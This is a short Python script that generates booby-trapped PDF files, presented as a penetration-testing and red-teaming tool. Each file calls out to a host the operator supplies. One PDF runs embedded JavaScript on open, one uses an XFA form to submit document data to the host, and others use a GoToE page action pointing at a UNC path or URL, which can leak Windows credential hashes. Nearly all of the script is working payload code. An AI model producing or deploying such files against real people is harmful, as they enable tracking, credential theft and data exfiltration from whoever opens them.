#!/usr/bin/python
##
## Create four different types of malicious PDF files. Used for penetration testing and/or red-teaming etc
##
## Usage ./malpdf.py burp-collaborator-url
##
## Output will be written as: test1.pdf, test2.pdf, test3.pdf and test4.pdf
##
## Based on https://github.com/modzero/mod0BurpUploadScanner/ and https://github.com/deepzec/Bad-Pdf
##
## Jonas Lejon, 2021 <jonas.github@triop.se>

from __future__ import print_function
import io
import sys

def create_malpdf3(filename, host):
    with io.FileIO(filename, "w") as file:
        file.write(
'''% a pdf file where javascript code is evaluated for execution
% BSD Licence, Ange Albertini, 2011
%PDF-1.4
1 0 obj
<<>>
%endobj
trailer
<<
/Root
  <</Pages <<>>
  /OpenAction
      <<
      /S/JavaScript
      /JS(
      eval(
          'app.openDoc({cPath: encodeURI("''' + host +'''"), cFS: "CHTTP" });'
          );
      )
      >>
  >>
>>''')

def create_malpdf2(filename, host):
    with io.FileIO(filename, "w") as file:
        file.write('''
% a PDF file using an XFA
% most whitespace can be removed (truncated to 570 bytes or so...)
% Ange Albertini BSD Licence 2012
% modified by InsertScript
%PDF-1. % can be truncated to %PDF-\0
1 0 obj <<>>
stream
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf>
    <interactive>1</interactive>
</pdf></present></config>
<template>
    <subform name="_">
        <pageSet/>
        <field id="Hello World!">
            <event activity="docReady" ref="$host" name="event__click">
               <submit
                     textEncoding="UTF-16"
                     xdpContent="pdf datasets xfdf"
                     target="''' + host + '''"/>
            </event>
</field>
    </subform>
</template>
</xdp:xdp>
endstream
endobj
trailer <<
    /Root <<
        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>''')

def create_malpdf(filename, host):
    with io.FileIO(filename, "w") as file:
        file.write('''
%PDF-1.7

1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
xref
0 4
0000000000 65535 f
0000000015 00000 n
0000000060 00000 n
0000000111 00000 n
trailer
<</Size 4/Root 1 0 R>>
startxref
190
3 0 obj
<< /Type /Page
   /Contents 4 0 R

   /AA <<
	   /O <<
	      /F (''' + host + ''')
		  /D [ 0 /Fit]
		  /S /GoToE
		  >>

	   >>

	   /Parent 2 0 R
	   /Resources <<
			/Font <<
				/F1 <<
					/Type /Font
					/Subtype /Type1
					/BaseFont /Helvetica
					>>
				  >>
				>>
>>
endobj


4 0 obj<< /Length 100>>
stream
BT
/TI_0 1 Tf
14 0 0 14 10.000 753.976 Tm
0.0 0.0 0.0 rg
(PDF Document) Tj
ET
endstream
endobj


trailer
<<
	/Root 1 0 R
>>

%%EOF
''')


if __name__ == "__main__":

  host = sys.argv[1]

  create_malpdf("test1.pdf", '\\\\' + '\\\\'  + host + '\\\\' )
  create_malpdf("test2.pdf", 'https://' + host)
  create_malpdf2("test3.pdf", 'https://' + host)
  create_malpdf3("test4.pdf", 'https://' + host)
